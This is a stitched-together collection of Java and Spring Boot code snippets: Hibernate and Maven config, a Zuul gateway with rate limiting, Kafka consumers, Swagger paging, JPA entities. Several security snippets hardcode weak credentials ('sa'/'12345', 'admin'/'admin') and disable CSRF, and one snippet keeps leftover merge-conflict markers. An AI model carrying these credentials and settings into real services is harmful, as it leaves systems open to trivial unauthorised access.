        return sessionFactoryBean;
    }

    private Properties hibernateProperties() {
        Properties properties = new Properties();
        properties.put("hibernate.hbm2ddl.auto", false);
        properties.put("hibernate.dialect", dialect);
        properties.put("hibernate.temp.use_jdbc_metadata_defaults", "false");
        properties.put("hibernate.show_sql",showSQL);
        properties.put("hibernate.format_sql",formatSQL);
        properties.put("entitymanager.packages.to.scan",packageScan);
        properties.put("connection.release_mode",releaseMode);
        return properties;
    }
}
--------------------------------------------------------------------------------------------------------
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
      </plugin>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>aspectj-maven-plugin</artifactId>
        <version>1.10</version>
        <configuration>
          <complianceLevel>1.8</complianceLevel>
          <source>${maven.compiler.source}</source>
          <target>${maven.compiler.target}</target>
          <showWeaveInfo>true</showWeaveInfo>
          <verbose>true</verbose>
          <Xlint>ignore</Xlint>
          <encoding>UTF-8 </encoding>
          <weaveDirectories>
            <weaveDirectory>${project.build.directory}/classes</weaveDirectory>
          </weaveDirectories>
          <forceAjcCompile>true</forceAjcCompile>
        </configuration>
        <executions>
          <execution>
            <goals>
              <goal>compile</goal>
              <!-- <goal>test-compile</goal> -->
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.BeanFactoryAware;
import org.springframework.stereotype.Component;
@Component
public class FactoryAwareBean implements BeanFactoryAware {
    @Override
    public void setBeanFactory(BeanFactory beanFactory) throws BeansException {
        System.out.println("I got the factory!");
    }
}

import org.springframework.beans.factory.BeanNameAware;
import org.springframework.stereotype.Component;
@Component
public class NameBean implements BeanNameAware {
    @Override
    public void setBeanName(String s) {
        System.out.println("Hello, my bean name is -" + s);
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.sql.Connection;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.core.io.ResourceLoader;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;

import net.sf.jasperreports.engine.JRException;
import net.sf.jasperreports.engine.JasperCompileManager;
import net.sf.jasperreports.engine.JasperFillManager;
import net.sf.jasperreports.engine.JasperPrint;
import net.sf.jasperreports.engine.JasperReport;

@Transactional
@Repository
public class UserDaoImpl {

 @Autowired
 @Qualifier("jdbcTemplate")
 private JdbcTemplate jdbcTemplate;

 @Autowired
 private ResourceLoader resourceLoader;

 public JasperPrint exportPdfFile() throws SQLException, JRException, IOException {
  Connection conn = jdbcTemplate.getDataSource().getConnection();

  String path = resourceLoader.getResource("classpath:rpt_users.jrxml").getURI().getPath();

  JasperReport jasperReport = JasperCompileManager.compileReport(path);

  // Parameters for report
  Map<String, Object> parameters = new HashMap<String, Object>();

  JasperPrint print = JasperFillManager.fillReport(jasperReport, parameters, conn);

  return print;
 }
}
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.jdbc.DataSourceBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.jdbc.core.JdbcTemplate;

@Configuration
public class WebConfig {
 
 @Bean(name = "db")
 @ConfigurationProperties(prefix = "spring.datasource")
 public DataSource dataSource() {
  return DataSourceBuilder.create().build();
 }

 @Bean(name = "jdbcTemplate")
 public JdbcTemplate jdbcTemplate(@Qualifier("db") DataSource ds) {
  return new JdbcTemplate(ds);
 }
}
--------------------------------------------------------------------------------------------------------
CREATE DATABASE `jack_rutorial` /*!40100 DEFAULT CHARACTER SET utf8 */;

DROP TABLE IF EXISTS `jack_rutorial`.`user`;
CREATE TABLE  `jack_rutorial`.`user` (
  `user_id` int(11) NOT NULL auto_increment,
  `user_name` varchar(45) NOT NULL default '',
  `email` varchar(45) NOT NULL default '',
  PRIMARY KEY  (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
--------------------------------------------------------------------------------------------------------
# ===============================
# DATABASE
# ===============================
 
spring.datasource.driver-class-name=net.sourceforge.jtds.jdbc.Driver
 
spring.datasource.url=jdbc:jtds:sqlserver://tran-vmware-pc:1433/testdb;instance=SQLEXPRESS
spring.datasource.username=sa
spring.datasource.password=12345
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "/uploadFile", method = RequestMethod.POST)
	@ResponseBody
	public ModelAndView uploadFile(@ModelAttribute("uploadedFile") UploadedFile uploadedFile, BindingResult result) throws IOException, BadFileNameException {
ModelAndView modelAndView = new ModelAndView();
 
		String fileName = null;
 
		MultipartFile file = uploadedFile.getFile();
		fileValidator.validate(uploadedFile, result);
//....
 
throw new IOException("Folder not found!");
			// throw new MyFileUploadException("Bad filename:" + fileName);
//...
}
--------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-jdbc</artifactId>
    <exclusions>
        <exclusion>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-jdbc</artifactId>
        </exclusion>
    </exclusions>
</dependency>
 
<dependency>
    <groupId>com.zaxxer</groupId>
    <artifactId>HikariCP</artifactId>
</dependency>
--------------------------------------------------------------------------------------------------------
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
 
import org.slf4j.Logger;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
 
@Component
public class LogInterceptor implements HandlerInterceptor {
 
  Logger log = org.slf4j.LoggerFactory.getLogger(this.getClass());
 
  @Override
  public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object object, Exception arg3)
      throws Exception {
    log.info("Request Completed!");
  }
 
  @Override
  public void postHandle(HttpServletRequest request, HttpServletResponse response, Object object, ModelAndView model)
      throws Exception {
    log.info("Method executed");
  }
 
  @Override
  public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object object) throws Exception {
    log.info("Before process request");
    return true;
  }
 
}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
 
@Configuration
public class AppConfig extends WebMvcConfigurerAdapter {
  
  @Autowired
  LogInterceptor logInterceptor;
  
  @Override
  public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(logInterceptor);
  }
}
--------------------------------------------------------------------------------------------------------
    @ManyToMany(cascade = { CascadeType.PERSIST }, fetch = FetchType.LAZY)
    @JoinTable(
            name = "USER_ANSWER",
            joinColumns = { @JoinColumn(name = "USER_ID") },
            inverseJoinColumns = { @JoinColumn(name = "QUESTION_ANSWER_ID") }
    )
    Set<QuestionAnswerItem> answers = new HashSet<>();
--------------------------------------------------------------------------------------------------------
import static com.google.common.collect.Lists.newArrayList;
import static springfox.documentation.spi.schema.contexts.ModelContext.inputParam;

import com.fasterxml.classmate.ResolvedType;
import com.fasterxml.classmate.TypeResolver;
import com.google.common.base.Function;
import com.google.common.collect.Sets;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;
import lombok.SneakyThrows;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Component;
import springfox.documentation.builders.OperationBuilder;
import springfox.documentation.builders.ParameterBuilder;
import springfox.documentation.schema.ModelReference;
import springfox.documentation.schema.ResolvedTypes;
import springfox.documentation.schema.TypeNameExtractor;
import springfox.documentation.service.Parameter;
import springfox.documentation.service.ResolvedMethodParameter;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.schema.contexts.ModelContext;
import springfox.documentation.spi.service.OperationBuilderPlugin;
import springfox.documentation.spi.service.contexts.OperationContext;
import springfox.documentation.spi.service.contexts.ParameterContext;

@Component
@Order(Ordered.LOWEST_PRECEDENCE)
public class OperationPageableParameterReader implements OperationBuilderPlugin {
    private final TypeNameExtractor nameExtractor;
    private final ResolvedType pageableType;
    private final TypeResolver resolver;

    @Autowired
    public OperationPageableParameterReader(TypeNameExtractor nameExtractor, TypeResolver resolver) {
        this.nameExtractor = nameExtractor;
        this.resolver = resolver;
        this.pageableType = resolver.resolve(Pageable.class);
    }

    @Override
    @SneakyThrows
    public void apply(OperationContext context) {
        List<ResolvedMethodParameter> methodParameters = context.getParameters();
        List<Parameter> parameters = newArrayList();

        for (ResolvedMethodParameter methodParameter : methodParameters) {
            ResolvedType resolvedType = methodParameter.getParameterType();
            if (!pageableType.equals(resolvedType)) {
                continue;
            }

            ParameterContext parameterContext = new ParameterContext(methodParameter, new ParameterBuilder(),
                    context.getDocumentationContext(), context.getGenericsNamingStrategy(), context);
            Function<ResolvedType, ? extends ModelReference> factory = createModelRefFactory(parameterContext);

            ModelReference intModel = factory.apply(resolver.resolve(Integer.TYPE));
            ModelReference stringModel = factory.apply(resolver.resolve(List.class, String.class));

            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("page")
                    .modelRef(intModel)
                    .description("Results page you want to retrieve (0..N)")
                    .build());
            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("size")
                    .modelRef(intModel)
                    .description("Number of records per page")
                    .build());
            parameters.add(new ParameterBuilder().parameterType("query")
                    .name("sort")
                    .modelRef(stringModel)
                    .allowMultiple(true)
                    .description("Sorting criteria in the format: property(,asc|desc). "
                            + "Default sort order is ascending. " + "Multiple sort criteria are supported.")
                    .build());

            final OperationBuilder operationBuilder = context.operationBuilder();
            operationBuilder.parameters(parameters);

            Set<String> toDelete = Sets.newLinkedHashSet(Arrays
                    .asList("offset", "pageNumber", "pageSize", "paged", "sort.sorted", "sort.unsorted", "unpaged"));
            final Field field = operationBuilder.getClass().getDeclaredField("parameters");
            field.setAccessible(true);
            @SuppressWarnings("unchecked")
            final List<Parameter> list = (List<Parameter>) field.get(operationBuilder);
            field.set(operationBuilder,
                    list.stream().filter(p -> !toDelete.contains(p.getName())).collect(Collectors.toList()));
        }
    }

    private Function<ResolvedType, ? extends ModelReference> createModelRefFactory(ParameterContext context) {
        ModelContext modelContext = inputParam(context.getGroupName(),
                context.resolvedMethodParameter().getParameterType(),
                context.getDocumentationType(),
                context.getAlternateTypeProvider(),
                context.getGenericNamingStrategy(),
                context.getIgnorableParameterTypes());
        return ResolvedTypes.modelRefFactory(modelContext, nameExtractor);
    }

    @Override
    public boolean supports(DocumentationType delimiter) {
        return true;
    }
}
--------------------------------------------------------------------------------------------------------
    {
      "name": "security.cors.allowed-paths",
      "type": "java.lang.String",
      "description": "Security CORS allowed paths."
    },
    {
      "name": "security.cors.allowed-methods",
      "type": "java.lang.String",
      "description": "Security CORS allowed methods."
    },
    {
      "name": "security.cors.allowed-origins",
      "type": "java.lang.String",
      "description": "Security CORS allowed origins."
    },
    {
      "name": "security.cors.allowed-headers",
      "type": "java.lang.String",
      "description": "Security CORS allowed headers."
    },
    {
      "name": "security.cors.exposed-headers",
      "type": "java.lang.String",
      "description": "Security CORS exposed headers."
    },
    {
      "name": "security.cors.allow-credentials",
      "type": "java.lang.String",
      "description": "Security CORS allow credentials option."
    },
    {
      "name": "security.cors.max-age",
      "type": "java.lang.String",
      "description": "Security CORS maximum age."
    }
--------------------------------------------------------------------------------------------------------
            <artifactId>springfox-swagger2</artifactId>
            <version>2.8.0</version>
            <artifactId>springfox-swagger-ui</artifactId>
            <version>2.8.0</version>
            <artifactId>springfox-data-rest</artifactId>
            <version>2.8.0</version>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-bean-validators</artifactId>
            <version>2.8.0</version>
--------------------------------------------------------------------------------------------------------
    @ApiOperation(value = "Find partners")
    @ApiImplicitParams({
        @ApiImplicitParam(name = "page", dataType = "integer", paramType = "query",
                value = "Results page you want to retrieve (0..N)"),
        @ApiImplicitParam(name = "size", dataType = "integer", paramType = "query",
                value = "Number of records per page."),
        @ApiImplicitParam(name = "sort", allowMultiple = true, dataType = "string", paramType = "query",
                value = "Sorting criteria in the format: property(,asc|desc). " +
                        "Default sort order is ascending. " +
                        "Multiple sort criteria are supported.")
    })
    @RequestMapping(value = "/v1/partners", method = RequestMethod.GET)
    @ResponseBody
    @ResponseStatus(HttpStatus.OK)
    public List<Partner> findAll(@ApiIgnore final Pageable pageable) {
            ...
    }
=======
   }
>>>>>>> 432fd06f3d93415f91e3a6c981fbb02f4b9687da
--------------------------------------------------------------------------------------------------------
    @Bean
    public UiConfiguration uiConfig() {
      return UiConfiguration.DEFAULT;
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.config.annotation.web.configuration.ResourceServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configurers.ResourceServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;

@Configuration
@EnableResourceServer
public class ApplicationSecurityConfiguration extends ResourceServerConfigurerAdapter {
    private final TokenStore tokenStore;

    @Autowired
    public ApplicationSecurityConfiguration(TokenStore tokenStore) {
        this.tokenStore = tokenStore;
    }

    @Override
    public void configure(ResourceServerSecurityConfigurer resources) throws Exception {
        // We're protecting a customers resource here.
        resources.resourceId("af4ddbce-481c-4a70-95e0-5dfeaa98eb07").tokenStore(tokenStore);
    }

    @Override
    public void configure(HttpSecurity http) throws Exception {
        // Disable CSRF, we're a microservice not a website.
        // Next configure the exception handling for authentication to return a 401 instead of a login page.
        http.csrf().disable()
                .exceptionHandling()
                .authenticationEntryPoint((request, response, authException) -> response.sendError(401))
            .and()
                // Authorization is required for all requests
                // Except for the OPTIONS request which requires anonymous access
                .authorizeRequests()
                    .antMatchers(HttpMethod.OPTIONS, "/**").permitAll()
                    .antMatchers("/**").authenticated()
            .and()
                // Use basic authentication headers because
                // JSON web tokens are transported in the authorization header
                .httpBasic()
            // Enable CORS
            .and()
                .cors();
    }
}
--------------------------------------------------------------------------------------------------------
spring:
  application:
    name: API Gateway
zuul:
  routes:
    aanvragen:
      path: /aanvragen/**
      url: http://altiis10.test.alfam.nl/moneyou/aanvragenservice/
    vkm:
      path: /vkm/**
      url: http://altiis10.test.alfam.nl/moneyou/vkmservice/
    tarieven:
      path: /tarieven/**
      url: http://altiis10.test.alfam.nl/moneyou/tarievenservice/
--------------------------------------------------------------------------------------------------------

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.netflix.zuul.EnableZuulProxy;

@EnableZuulProxy
@SpringBootApplication
public class ApigatewayApplication {

	public static void main(String[] args) {
		SpringApplication.run(ApigatewayApplication.class, args);
	}
}
--------------------------------------------------------------------------------------------------------
import com.github.bucket4j.Bandwidth;
import com.github.bucket4j.Bucket;
import com.github.bucket4j.Bucket4j;
import com.github.bucket4j.Refill;
import com.netflix.zuul.context.RequestContext;
import org.springframework.stereotype.Component;

import java.time.Duration;
import java.util.HashMap;
import java.util.Map;

/**
 * Throttles requests based on a bucket/token algorithm
 */
@Component
public class Throttler {
    private final Map<String, Bucket> buckets;

    /**
     * Initializes a new instance of the throttler
     */
    public Throttler() {
        buckets = new HashMap<>();
    }

    /**
     * Throttles the current request by using the specified amount of tokens
     *
     * @param context Context for the request
     * @param amount  Amount of tokens used by the request
     * @return Returns true when the request can be executed; Otherwise false
     */
    public boolean throttle(RequestContext context, long amount) {
        String identifier = clientIdentifier(context);

        if (!buckets.containsKey(identifier)) {
            buckets.put(identifier, createBucket());
        }

        return buckets.get(identifier).tryConsume(amount);
    }

    /**
     * Generates an identifier for the client that we want to be throttled
     *
     * @param context Request context
     * @return Returns the client identifier for the request
     */
    private String clientIdentifier(RequestContext context) {
        String clientIpAddress = context.getRequest().getRemoteAddr();
        String accessToken = getAccessToken(context);

        if (accessToken != null && !accessToken.isEmpty()) {
            return accessToken;
        }

        return clientIpAddress;
    }

    /**
     * Retrieves the access token from the request
     *
     * @param context Request context
     * @return Returns the access token
     */
    private String getAccessToken(RequestContext context) {
        String authorizationHeader = context.getRequest().getHeader("Authorization");

        if (authorizationHeader != null && authorizationHeader.startsWith("Bearer")) {
            return authorizationHeader.substring("Bearer".length() + 1);
        }

        return null;
    }

    /**
     * Creates a new bucket for incoming requests
     *
     * @return Returns the bucket for the incoming requests
     */
    private Bucket createBucket() {
        Refill refill = Refill.smooth(1000, Duration.ofHours(1));
        Bandwidth limit = Bandwidth.classic(1000, refill);

        return Bucket4j.builder().addLimit(limit).build();
    }
}
--------------------------------------------------------------------------------------------------------
import com.netflix.zuul.ZuulFilter;
import com.netflix.zuul.context.RequestContext;
import nl.fizzylogic.apigateway.services.Throttler;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

/**
 * Limits the amount of requests a client can send
 */
@Component
public class RateLimitingFilter extends ZuulFilter {
    private final Throttler throttler;

    /**
     * Initializes a new instance of {@link RateLimitingFilter}
     *
     * @param throttler Throttler to use for the filter
     */
    @Autowired
    public RateLimitingFilter(Throttler throttler) {
        this.throttler = throttler;
    }

    /**
     * Gets the type of filter
     *
     * @return
     */
    @Override
    public String filterType() {
        return "pre";
    }

    /**
     * Gets the priority for the filter
     *
     * @return
     */
    @Override
    public int filterOrder() {
        return 0;
    }

    /**
     * Checks whether the filter should be executed
     *
     * @return
     */
    @Override
    public boolean shouldFilter() {
        return true;
    }

    /**
     * Executes the filter refusing requests that are over the limit
     *
     * @return
     */
    @Override
    public Object run() {
        RequestContext context = RequestContext.getCurrentContext();

        if (!throttler.throttle(context, 1)) {
            context.setSendZuulResponse(false);

            context.setResponseStatusCode(429);
            context.setResponseBody("{ \"message\": \"Too many requests\" }");
            context.getResponse().setContentType("application/json");
        }

        return null;
    }
}
--------------------------------------------------------------------------------------------------------
import org.apache.commons.cli.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Program {
    private static final String COMMANDLINE_ARG_INPUT = "in";
    private static final String COMMANDLINE_ARG_OUTPUT = "out";

    private Logger logger = LoggerFactory.getLogger(Program.class);

    // CHANGE THIS: Make sure that you enter the correct indices to be masked with hashed values.
    private static final List<Integer> MASKED_FIELDS = Arrays.asList(1,3,4);

    public static void main(String[] args) {
        new Program().run(args);
    }

    public void run(String[] args) {
        CommandLine commandLine = parseArguments(args);

        if (commandLine == null) {
            System.exit(1);
            return;
        }

        HashedValueRegistry valueRegistry = new HashedValueRegistry();

        Path inputFolder = Paths.get(commandLine.getOptionValue(COMMANDLINE_ARG_INPUT));
        Path outputFolder = Paths.get(commandLine.getOptionValue(COMMANDLINE_ARG_OUTPUT));

        try (DirectoryStream<Path> inputFiles = Files.newDirectoryStream(inputFolder)) {
            for (Path inputFile : inputFiles) {
                CsvFileProcessor processor = new CsvFileProcessor(valueRegistry, inputFile, outputFolder);
                processor.process(MASKED_FIELDS);
            }
        } catch (IOException e) {
            logger.error("Could not read from the input folder.", e);
        }
    }

    private Options commandLineArguments() {
        return new Options()
                .addOption(Option.builder(COMMANDLINE_ARG_INPUT).hasArg().required().build())
                .addOption(Option.builder(COMMANDLINE_ARG_OUTPUT).hasArg().required().build());
    }

    private CommandLine parseArguments(String[] args) {
        CommandLineParser parser = new DefaultParser();

        try {
            return parser.parse(commandLineArguments(), args);
        } catch (ParseException e) {
            logger.error("Failed to parse the commandline arguments", e);
            return null;
        }
    }
}
--------------------------------------------------------------------------------------------------------
POST /.../{resource}/{resource-id}/actions/{action}
GET /.../{resource}[?page_index={page_index}]
/{resource}/{resource-id}/{sub-resource}/{sub-resource-id}
--------------------------------------------------------------------------------------------------------
bin\kafka-topic.sh --zookeeper localhost:2181 --create --replication-factor 1 --partitions 1 --topic events
bin/zookeeper-server-start.sh config/zookeeper.properties
bin/kafka-server-start.sh config/server.properties
--------------------------------------------------------------------------------------------------------
import org.apache.kafka.clients.consumer.ConsumerRecords;
import org.apache.kafka.clients.consumer.KafkaConsumer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

public class ConsumerApp {
    private static final Logger log = LoggerFactory.getLogger(ConsumerApp.class);

    public static void main(String[] args) throws Exception {

        // Required properties:
        //  - broker host used to discover brokers in your cluster from which messages need to be fetched
        //  - group ID to identify the application that is fetching (you can have multiple instances of a consumer)

        Properties consumerProperties = new Properties();
        consumerProperties.put("bootstrap.servers", "localhost:9092");
        consumerProperties.put("group.id", "consumerapp");

        // Set some default deserializers for the consumed messages.
        // This is required because otherwise Kafka doesn't know what to do with the data.
        consumerProperties.put("key.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");
        consumerProperties.put("value.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");

        // Use autocommit settings so that you don't need to commit the messages you received.
        // This is typically done in scenarios where consistency isn't an issue.
        consumerProperties.put("enable.auto.commit", "true");
        consumerProperties.put("auto.commit.interval.ms", "1000");

        KafkaConsumer<String, String> consumer = new KafkaConsumer<String, String>(consumerProperties);

        // Always call subscribe first!
        // Otherwise you can poll all you want, but get nothing in return.
        consumer.subscribe(Arrays.asList("events"));

        while (true) {
            // Use a polling timeout to retrieve messages.
            // Increase the timeout value to slow down the message flow and decrease the load on the brokers.
            // You will get more messages each time you poll with a longer timeout setting.
            // But it does mean you have to wait longer for the messages to come in.
            ConsumerRecords<String, String> records = consumer.poll(100);

            // Process the messages here.
            records.forEach(msg -> log.info("Received message: {}", msg.value()));
        }
    }
}
import org.apache.kafka.clients.consumer.ConsumerRecords;
import org.apache.kafka.clients.consumer.KafkaConsumer;
import org.apache.kafka.clients.consumer.OffsetAndMetadata;
import org.apache.kafka.common.TopicPartition;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Semaphore;

public class ConsumerApp {
    private static final Logger log = LoggerFactory.getLogger(ConsumerApp.class);

    public static void main(String[] args) throws Exception {

        // Required properties:
        //  - broker host used to discover brokers in your cluster from which messages need to be fetched
        //  - group ID to identify the application that is fetching (you can have multiple instances of a consumer)

        Properties consumerProperties = new Properties();
        consumerProperties.put("bootstrap.servers", "localhost:9092");
        consumerProperties.put("group.id", "consumerapp");

        // Set some default deserializers for the consumed messages.
        // This is required because otherwise Kafka doesn't know what to do with the data.
        consumerProperties.put("key.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");
        consumerProperties.put("value.deserializer", "org.apache.kafka.common.serialization.StringDeserializer");

        KafkaConsumer<String,String> consumer = new KafkaConsumer<String, String>(consumerProperties);

        // Always call subscribe first!
        // Otherwise you can poll all you want, but get nothing in return.
        consumer.subscribe(Arrays.asList("events"));

        while(true) {
            Map<TopicPartition, OffsetAndMetadata> committedOffsets = new HashMap<>();

            // Use a polling timeout to retrieve messages.
            // Increase the timeout value to slow down the message flow and decrease the load on the brokers.
            // You will get more messages each time you poll with a longer timeout setting.
            // But it does mean you have to wait longer for the messages to come in.
            ConsumerRecords<String,String> records = consumer.poll(100);

            records.forEach(msg -> {
                log.info("Received message: {}",msg.value());

                // Mark the current message as processed by putting them in the commit map.
                // Any messages that fail to process are left out of this map.
                committedOffsets.put(
                        new TopicPartition(msg.topic(), msg.partition()),
                        new OffsetAndMetadata(msg.offset()));
            });

            // Mark the processed messages as committed on the server.
            // With Kafka you can have multiple messages that are uncomitted, just leave them
            // out of the map and commit the rest using the commitSync or commitAsync method.
            consumer.commitSync(committedOffsets);
        }
    }
}
--------------------------------------------------------------------------------------------------------
script: mvn deploy --settings .travis-oss-settings.xml
--------------------------------------------------------------------------------------------------------
import scala.concurrent.Future;
import scala.concurrent.impl.Promise.DefaultPromise;

import com.google.common.util.concurrent.FutureCallback;
import com.google.common.util.concurrent.Futures;
import com.google.common.util.concurrent.ListenableFuture;

public final class Scala {
	
    public static <T> Future<T> asFuture(ListenableFuture<T> future) {
        final scala.concurrent.Promise<T> promise = new DefaultPromise<T>();
        Futures.addCallback(future, new FutureCallback<T>() {
            @Override public void onSuccess(T result) {
                promise.success(result);
            }
            @Override public void onFailure(Throwable t) {
                promise.failure(t);
            }
        });
        return promise.future();
    }
    
    public static <T, A> Future<Fun.Tuple2<T, A>> asFuture(ListenableFuture<T> future, A a) {
        final scala.concurrent.Promise<Fun.Tuple2<T, A>> promise = new DefaultPromise<Fun.Tuple2<T, A>>();
        Futures.addCallback(future, new FutureCallback<T>() {
            @Override public void onSuccess(T result) {
                promise.success(new Fun.Tuple2<T, A>(result, a));
            }
            @Override public void onFailure(Throwable t) {
                promise.failure(t);
            }
        });
        return promise.future();
    }
    
    public static <T, A, B> Future<Fun.Tuple3<T, A, B>> asFuture(ListenableFuture<T> future, A a, B b) {
        final scala.concurrent.Promise<Fun.Tuple3<T, A, B>> promise = new DefaultPromise<Fun.Tuple3<T, A, B>>();
        Futures.addCallback(future, new FutureCallback<T>() {
            @Override public void onSuccess(T result) {
                promise.success(new Fun.Tuple3<T, A, B>(result, a, b));
            }
            @Override public void onFailure(Throwable t) {
                promise.failure(t);
            }
        });
        return promise.future();
    }
    
    public static <T, A, B, C> Future<Fun.Tuple4<T, A, B, C>> asFuture(ListenableFuture<T> future, A a, B b, C c) {
        final scala.concurrent.Promise<Fun.Tuple4<T, A, B, C>> promise = new DefaultPromise<Fun.Tuple4<T, A, B, C>>();
        Futures.addCallback(future, new FutureCallback<T>() {
            @Override public void onSuccess(T result) {
                promise.success(new Fun.Tuple4<T, A, B, C>(result, a, b, c));
            }
            @Override public void onFailure(Throwable t) {
                promise.failure(t);
            }
        });
        return promise.future();
    }
    
    public static <T, A, B, C, D> Future<Fun.Tuple5<T, A, B, C, D>> asFuture(ListenableFuture<T> future, A a, B b, C c, D d) {
        final scala.concurrent.Promise<Fun.Tuple5<T, A, B, C, D>> promise = new DefaultPromise<Fun.Tuple5<T, A, B, C, D>>();
        Futures.addCallback(future, new FutureCallback<T>() {
            @Override public void onSuccess(T result) {
                promise.success(new Fun.Tuple5<T, A, B, C, D>(result, a, b, c, d));
            }
            @Override public void onFailure(Throwable t) {
                promise.failure(t);
            }
        });
        return promise.future();
    }
}
--------------------------------------------------------------------------------------------------------
https://github.com/wmeints/casser/blob/develop/src/main/java/com/noorq/casser/mapping/javatype/UUIDJavaType.java
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.security.SecurityProperties;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

import javax.sql.DataSource;

@Configuration
@Order(SecurityProperties.ACCESS_OVERRIDE_ORDER)
public class ApplicationSecurity extends WebSecurityConfigurerAdapter {

    @Autowired
    private DataSource dataSource;

    public void configure(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.csrf().disable();

        httpSecurity.authorizeRequests()
                .antMatchers("/app/**")
                .permitAll()
                .and()
                .authorizeRequests()
                .anyRequest()
                .authenticated()
                .and()
                .formLogin().loginPage("/account/logon").failureUrl("/account/logon?error")
                .permitAll()
                .and()
                .logout()
                .logoutUrl("/account/logoff")
                .permitAll();

    }

    public void configure(AuthenticationManagerBuilder authentication) throws Exception {
        authentication.jdbcAuthentication().dataSource(dataSource)
                .withUser("admin").password("admin").roles("ADMIN");
    }
}
--------------------------------------------------------------------------------------------------------
@Entity
@Table(name = "container")
@Cache(usage = CacheConcurrencyStrategy.NONSTRICT_READ_WRITE)
@Document(indexName = "container")
public class Container implements Serializable {

    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "sequenceGenerator")
    @SequenceGenerator(name = "sequenceGenerator")
    private Long id;

    @NotNull
    @Column(name = "name", nullable = false)
    private String name;

    @ManyToMany
    @Cache(usage = CacheConcurrencyStrategy.NONSTRICT_READ_WRITE)
    @JoinTable(name = "container_item",
               joinColumns = @JoinColumn(name="container_id", referencedColumnName="id"),
               inverseJoinColumns = @JoinColumn(name="items_id", referencedColumnName="id"))
    private Set<Item> items = new HashSet<>();
}

@Entity
@Table(name = "item")
@Cache(usage = CacheConcurrencyStrategy.NONSTRICT_READ_WRITE)
@Document(indexName = "item")
public class Item implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "sequenceGenerator")
    @SequenceGenerator(name = "sequenceGenerator")
    private Long id;

    @NotNull
    @Column(name = "name", nullable = false)
    private String name;

    @NotNull
    @Enumerated(EnumType.STRING)
    @Column(name = "type", nullable = false)
    private Type type;

    @ManyToMany(mappedBy = "items")
    @JsonIgnore
    @Cache(usage = CacheConcurrencyStrategy.NONSTRICT_READ_WRITE)
    private Set<Container> containers = new HashSet<>();
}
--------------------------------------------------------------------------------------------------------
